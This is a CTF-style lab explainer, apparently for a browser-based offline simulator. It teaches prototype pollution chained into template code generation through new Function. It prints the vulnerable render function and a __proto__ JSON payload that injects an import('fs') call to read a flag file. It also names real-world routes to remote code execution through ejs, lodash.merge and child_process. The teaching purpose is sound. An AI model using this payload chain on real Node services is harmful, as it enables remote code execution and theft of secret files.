为什么这一关是"离线模拟器"

原型链污染与 new Function 代码生成只能在 JavaScript 里真实发生。本页把原 Node 服务端（_original/server.js）的 deepMerge、模板引擎与配置对象逐字搬进了你的浏览器：污染真实发生在当前页面的 Object.prototype 上，注入的代码由真实的 new Function 执行。

唯一的模拟成分：浏览器没有 Node 的模块系统，模拟器把代码里的动态 import('x') 映射到页面内置的伪模块——fs 读取的是页面内置的模拟文件系统（VFS），机密文件就在里面。

知识点讲解

模板引擎的代码生成（漏洞②，默认参数从原型继承；与原服务端一致，仅 import() 改写一行是模拟器适配）：

function render(tpl, data, opts) {
  opts = opts || {};                    // 空 options 对象
  const prepend = opts.prepend || '';   // ← 污染后：Object.prototype.prepend 参与拼码
  const code = String(prepend).replace(/\bimport\s*\(/g, '__import(');  // 模拟器：import() → 内置伪模块
  const fn = new Function('data', '__import', code + 'return \`'+tpl+'\`;');
  return fn(data, __import);
}

完整链路（merge 漏洞 × 代码生成漏洞）：

保存配置  {"__proto__":{"prepend":"return import('fs').then(m=>m.readFileSync('/srv/pp2/flag_pp2.txt','utf8'));"}}
渲染预览  →  new Function 里第一行就是注入的 return → import('fs') 读文件 → Promise 结果回显

真实世界对应物：

  • ejs + lodash.merge（或 qs/querystring 解析 + 任何 deep-merge）：污染 outputFunctionName/escapeFunction 等 "会进编译代码"的选项 → RCE（2019 年起大量 Node CTF 的模板题）。
  • 污染 child_process 的 options / NODE_OPTIONS / shell 字段达成命令执行。
  • 历史注脚：经典 payload process.mainModule.require('child_process') 在 Node 22+ 已随 mainModule 移除而失效， 取而代之的是动态 import()——本题演示的就是它（引擎侧对渲染结果做 Promise 兼容后，异步读文件的结果可以直达响应；模拟器里同样是 Promise 回显）。

模拟器与真实环境的差异（教学注记）：真实 ejs/Node 引擎不会把 Promise 结果回显，攻击者用副作用落地——写文件、回连 OOB、直接起进程；本页为了教学把异步结果直接显示在结果区，技术内核（污染 → 拼码 → 执行）完全一致。
